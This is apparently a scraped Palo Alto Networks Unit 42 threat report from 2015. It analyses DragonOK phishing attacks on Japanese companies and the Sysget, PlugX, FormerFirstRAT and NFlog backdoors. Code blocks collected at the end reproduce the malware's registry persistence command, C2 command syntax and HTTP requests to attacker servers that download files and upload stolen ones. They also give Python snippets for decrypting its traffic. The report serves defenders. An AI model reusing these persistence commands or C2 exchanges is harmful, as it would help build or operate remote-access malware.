{
    "title": "unit 42 identifies new dragonok backdoor malware deployed against japanese targets",
    "text": "Tools\nPlaybooks\nSpeaking Events\nAbout Us\nUnit 42 Identifies New DragonOK Backdoor\nMalware Deployed Against Japanese Targets\n30,873\npeople reacted\n0\n8 min. read\nSummary\nPalo Alto Networks Unit 42 used the AutoFocus  threat intelligence service to identify a series of phishing attacks\nagainst Japanese organizations. Using AutoFocus to quickly search and correlate artifacts across the collective set\nof WildFire and other Palo Alto Networks threat intelligence, we were able to associate the attacks with the\ngroup publicly known as “DragonOK.” [1] These attacks took place between January and March of 2015.\nDragonOK has previously targeted Japanese high‐tech and manufacturing firms, but we’ve identified a new\nbackdoor malware, named “FormerFirstRAT,” deployed by these attackers. See the “Malware Details” section for\nanalysis of the three RATs and two additional backdoors deployed in this persistent attack campaign.\nCampaign Details\nThis campaign involved five separate phishing attacks, each carrying a different variant of Sysget malware, also\nknown as HelloBridge. The malware was included as an attachment intended to trick the user into opening the\nmalware. This included altering the icon of the executable to appear as other file types (Figure 1) as well as decoy\ndocuments to trick users into thinking they had opened a legitimate file.\nFigure 1. Icons used by malicious Sysget attachments.\nAll of the Sysget files used in this campaign communicate with a single command and control (C2) server, hosted\nat biosnews[.]info. Sysget communicates with this server using the HTTP protocol; see the Malware Details\nsection for specifics of the command and control traffic. All five phishing campaigns targeted a Japanese\nmanufacturing firm over the course of two months, but the final campaign also targeted a separate Japanese\nhigh‐tech organization. (Figure 2)\nFigure 2. Five Sysget samples used to target two Japanese organizations.\nFour of the five Sysget variants included a form of decoy document to trick users into believing they had opened\na legitimate file rather than malware. Two of the executables used decoy documents that included information\nabout obituaries. Figure 3 shows a GIF file containing an obituary notice for a woman, while Figure 4 shows a\nMicrosoft Word document containing the obituary of a man.\nFigure 3. Japanese decoy document containing an obituary notice for a woman.\nFigure 4. Japanese decoy document containing an obituary notice for a woman.\nThe Sysget sample with a PDF icon created a second executable, named Adobe.exe, which simply displayed the\nfollowing warning.\nFigure 5. Error message generated by Adobe.exe\nThe final Sysget sample used a Microsoft Excel icon and opened an Excel document that contained cells filled\nwith “XXXXXX.” (Figure 6)\nFigure 6. Excel spreadsheet with Xs in multiple rows and columns.\nThese Sysget variants appear to be a first stage payload in these attacks. During analysis of this threat, we\nidentified five additional backdoor tools hosted on biosnews[.]info which may be downloaded by the Sysget\nvariants once the attackers have established a foothold.\nThree of the backdoors, NFlog, PoisonIvy, and NewCT have previously been publicly associated with DragonOK.\nAdditionally, the actors have now added the popular PlugX backdoor to their toolkit. An additional backdoor\nappears to be a new, custom‐built tool, which we have not previously associated with DragonOK or any other\nattack group. We’ve named this tool “FormerFirstRAT” as it appears to be the names used by the developers to\nrefer to their creations. Figure 7 shows the relationship between these backdoors and their respective command\nand control servers.\nFigure 7. Relationship between five additional backdoors used by DragonOK and their C2 servers in this\ncampaign.\nThe following section details the functionality of the malware deployed in this campaign.\nMalware Details\nSysget/HelloBridge\nIn this campaign, Sysget samples were attached to e‐mails and used various icons to trick users into infecting\ntheir systems. The majority of these samples are self‐extracting executables that contain both a malicious\ndownloader, along with a legitimate file. When the self‐extracting executable is launched, the downloader and\nlegitimate file are typically dropped in one of the following directories and then executed:\n%PROGRAMFILES%\n%WINDIR%\\Temp\nWhen the malicious downloader is executed, it begins by creating the ‘mcsong[]’ event in order to ensure one\ninstance is running. It then spawns a new instance of ‘C:\\\\windows\\\\system32\\\\cmd.exe’ with a window name of\n‘Chrome‐Update’. It attempts to obtain a handle to this window using the FindWindowW API call and then\nproceeds to send the following command to this executable. This allows the malware to indirectly execute a\ncommand within the cmd.exe process.\nThis registry key will ensure an executable that it later downloads is configured to persist across reboots. It then\nsends the ‘exit’ command to this executable, which will kill this particular process.\nThe malware then attempts to read the following file. This file is used to store a key that is later used to decrypt\ndata received during network communications.\n%temp%\\ibmCon6.tmp\nIf the file does not exist, it will make the following GET request:\nThe filename and name parameters are statically set in the above request. The server responds with data similar\nto the following:\nThe first two pieces of data (’17’ and ‘gh204503254’) are then written to the ibmCon6.tmp file referenced earlier.\nThe malware will copy itself to the %TEMP% directory with the executable name of ‘notilv.exe’. Due to the\npreviously written registry key, this file will execute when the machine is restarted and the current user logs in.\nThe malware then makes the following request:\nThe filename and uid parameters are statically set in the above request. The response data is decrypted using\nthe RC4 cryptographic stream cipher. The ‘gh204503254’ data that was previously downloaded is used as the key.\nThe following Python code can be used for decryption, using the ‘gh204503254’ key:\nAt this stage, the remote server can send a number of different responses. The following example response will\ninstruct the malware to download a remote executable file:\n‘filename.exe’ is the path where the downloaded file will be stored, and ‘01234567890123456789012345678901’\nis the value supplied in the subsequent HTTP request. When this command is received, the following example\nrequest is made:\nAt this point, the remote server will respond with an unencrypted file that the malware saves to the system.\nThe remote server can also send the following example response. This response will instruct the malware to\nupload the specified file:\nAn example upload request can be seen below:\nThe remote server can also send the following example response. This response will instruct the malware to\nexecute the given command:\nThe results of this ‐execution are stored in a temporary text file in the %TEMP% directory. These results are\nencrypted using the same technique mentioned previously. An example upload of these results can be seen\nbelow:\nPlugX\nPlugX is a backdoor that is often used by actors in targeted attacks. This version of PlugX attempts to disguise\nitself as a Symantec product. The following icon is present in this sample:\nFigure 8. PlugX file uses Symantec logo icon.\nUpon execution, the malware will install itself as a service with the following parameters:\nService Name RasTls\nService Display Name RasTls\nService Description Symantec 802.1x Supplicant\nIt may also set the following registry key for persistence:\nPlugX is a well‐studied malware family with a long history of use in targeted attacks. More information on its\nhistory is available at the following links.\nhttps://www.fireeye.com/blog/threat‐research/2014/07/pacific‐ring‐of‐fire‐plugx‐kaba.html\nhttp://www.sophos.com/en‐us/medialibrary/pdfs/technical%20papers/plugx‐thenextgeneration.pdf\nhttps://www.blackhat.com/docs/asia‐14/materials/Haruyama/Asia‐14‐Haruyama‐I‐Know‐You‐Want‐Me‐\nUnplugging‐PlugX.pdf\nFormerFirstRAT\nThis remote administration tool (RAT) is referred to as “FormerFirstRAT” by its authors. FormerFirstRAT\ncommunicates using unencrypted HTTP over port 443; the use of mismatching ports and communication\nprotocols is not uncommon in targeted attack campaigns. In addition, port / protocol mis‐match traffic can be an\nindicator of bad activity.\nWhen the malware starts, it writes the following registry key to ensure persistence:\nThe malware then proceeds to send an HTTP POST request with information about the victim system. The\nfollowing information is collected:\nVictim IP address\nUsername\nAdministrative privileges\nRAT status (active/sleep)\nRAT version (in this case, 0.8)\nMicrosoft Windows version\nUserID (Volume Serial followed by an underscore and a series of ‘1’s)\nLanguage\nThe following settings are used for command and control:\nThe malware encrypts network communication using the AES128 encryption cipher. It uses the MD5 of\n‘tucwatkins’ in order to generate the key. All data is sent via HTTP POST requests. While not a distinct TTP, the\nauthor of this malware may be a soap‐opera fan. The following code demonstrates how you can decrypt the\nmalware communications using Python:\nThe malware then enters a loop where it will send out periodic requests to the remote server. The remote\nserver has the ability to respond and provide instructions to the RAT. We have identified the following\nfunctionalities:\nModify sleep timer between requests\nExecute a command and return the command output\nBrowse the file system\nDownload files\nDelete files\nExfiltrate victim information\nAn example HTTP POST request can be seen below.\nNFlog\nWhen loaded inside of a running process, NFlog begins by spawning a new thread. This new thread is responsible\nfor all malicious activities produced by this DLL. Initially, the malware will set the following registry key:\nWhere [current_executable_filename] is the path to the current running executable, which is acquired via a call\nto GetModuleFileNameA. This registry key ensures that the malware will persist across reboots when the current\nuser logs in.\nMultiple string obfuscation routines are included in this malware sample. Strings contained in the binary are\ndecrypted via a simple binary XOR against a single byte key of 0x25.\nThe malware proceeds to create a named event object of ‘GoogleZCM’ and uses this event in order to ensure\nonly one instance of this malware is running at a given time.\nThe malware proceeds to make an attempt at binding to the local host on port 1139.\nThe malware attempts to ensure Internet connectivity by making a request to www.microsoft.com. An example\nrequest is shown below.\nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nBy Jen Miller‐Osborn  and Josh Grunzweig\nApril 14, 2015 at 1:31 PM\nCategory: Malware , Threat Advisory/Analysis , Threat Prevention , Unit 42\nTags: AutoFocus , DragonOK , FormerFirstRAT , HelloBridge , Japan , NewCT , NFlog , PlugX , PoisonIvy , Sysget\nEmail address\nSubscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.\nPopular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal No ces\nPrivacy\nTerms of Use\nDocuments\nAccount\nManage Subscriptions\nReport a Vulnerability1reg add hkcu\\software \\microsoft \\windows\\currentversion \\run /v netshare  /f /d %temp%\\notilv.exe /t REG_EXPAND_SZ\n1\n2\n3\n4\n5\n6GET /index.php?fn=s4&name=4890c2d546fa48a536b75b48b17de023   \nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible ; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews [.]info\nConnection : Keep-Alive\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15HTTP/1.1 200 OK\nDate: Wed, 11 Mar 2015 00:14:14 GMT\nServer: Apache/2.4.12 (Unix) OpenSSL/1.0.1e-fips\nmod_bwlimited /1.4 mod_fcgid /2.3.10-dev\nX-Powered-By: PHP/5.4.37\nKeep-Alive: timeout=5\nConnection : Keep-Alive\nTransfer -Encoding : chunked\nContent-Type: text/html\n \n17\ngh204503254\n1916733707\n \n0\n1\n2\n3\n4\n5\n6GET /index.php?fn=s1&uid=fc1a8359e0f4cb8d60920dc066b8b21c\nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible ; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews [.]info\nConnection : Keep-Alive\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11from wincrypto import CryptCreateHash , CryptHashData ,\nCryptDeriveKey , CryptDecrypt\n \nCALG_RC4  = 0x6801\nCALG_MD5  = 0x8003\n \nmd5_hasher  = CryptCreateHash (CALG_MD5 )\nCryptHashData (md5_hasher , 'gh204503254' )\nrc4_key = CryptDeriveKey (md5_hasher , CALG_RC4 )\ndecrypted_data  = CryptDecrypt (rc4_key, final_data )\npp.pprint(decrypted_data )\n1sys getinto \"filename.exe\"  \"01234567890123456789012345678901\" ;\\n\n1\n2\n3\n4\n5\n6GET /index.php?fn=s3&file=01234567890123456789012345678901\nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible ; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews [.]info\nConnection : Keep-Alive\n1sys upto \"filename.exe\" ;\\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26POST /index.php?fn=s2&item=70efdf2ec9b086079795c442636b55fb\nHTTP/1.1\nAccept: text/html, application /xhtml+xml, */*\nContent-Type: multipart /form-data; boundary =---------------------------d5340oqbasdfaa\nUser-Agent: Mozilla/5.0 (compatible ; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews [.]info\nContent-Length: 115126\nConnection : Keep-Alive\n \n-----------------------------d5340oqbasdfaa\nContent-Disposition : form-data; name=\"file\";\nfilename =\"calc_malware.exe\"\nContent-Type: application /octet-stream\n \n[BINARY_DATA ]\n \n-----------------------------d5340oqbasdfaa\nContent-Disposition : form-data; name=\"path\"\n \n70efdf2ec9b086079795c442636b55fb\n-----------------------------d5340oqbasdfaa\nContent-Disposition : form-data; name=\"submit\"\n \nSubmit\n-----------------------------d5340oqbasdfaa --\n1[command];\\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25POST /index.php?fn=s2 HTTP/1.1\nAccept: text/html, application /xhtml+xml, */*\nContent-Type: multipart /form-data; boundary =---------------------------d5340oqbasdfaa\nUser-Agent: Mozilla/5.0 (compatible ; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews [.]info\nContent-Length: 1609\nConnection : Keep-Alive\n \n-----------------------------d5340oqbasdfaa\nContent-Disposition : form-data; name=\"file\";\nfilename =\"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\.txt\"\nContent-Type: application /octet-stream\n \n[BINARY_DATA ]\n \n-----------------------------d5340oqbasdfaa\nContent-Disposition : form-data; name=\"path\"\n \n70efdf2ec9b086079795c442636b55fb\n-----------------------------d5340oqbasdfaa\nContent-Disposition : form-data; name=\"submit\"\n \nSubmit\n-----------------------------d5340oqbasdfaa —\n1HKCU\\Software \\Microsoft \\Windows\\CurrentVersion \\Run\\RasTls - %windir%\\system32 \\svchost.exe\n1[HKCU|HKLM]\\\\Software \\\\Microsoft \\\\Windows\\\\CurrentVersion \\\\Run\\\\WmdmPmSp  -> EXE of DLL\n1\n2\n3\n4Hostname : https.reweblink .com\nPort: 443\nTimer: 180000\nMethod: POST\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10from wincrypto import CryptCreateHash , CryptHashData , CryptDeriveKey , CryptEncrypt , CryptDecrypt\n \nCALG_AES_128  = 0x660e\nCALG_MD5  = 0x8003\n \ndata = \"...\" # Encrypted Data\nmd5_hasher  = CryptCreateHash (CALG_MD5 )\nCryptHashData (md5_hasher , 'tucwatkins' )\naes_key = CryptDeriveKey (md5_hasher , CALG_AES_128 )\ndecrypted_data  = CryptDecrypt (aes_key, data)\n1\n2\n3\n4\n5\n6\n7\n8\n9POST / HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible ; MSIE 6.0; Windows NT 5.0;\n.NET CLR  1.1.4322 )\nHost: https.reweblink .com:443\nContent-Length: 48\nCache-Control: no-cache\n \n[encrypted binary data]\n1HKCU\\\\SOFTWARE \\\\Microsoft \\\\Windows\\\\CurrentVersion \\\\Run\\\\update : [current_executable_filename ]\n1\n2\n3\n4\n5\n6GET / HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible ; MSIE 7.0;Windows NT 5.1)\nHost: www.microsoft .com\nCache-Control: no-cache\nCookie: WT_NVR=0=/:1=genuine:2=genuine/validate ; MC1=GUID=aa8ac5ed26b9bf4f8d3bd1b2dcaa82f6 &HASH=edc5&LV=201503&V=4&LU=1427378060061\n%3\nSearch Unit 42\nSHARE \n "
}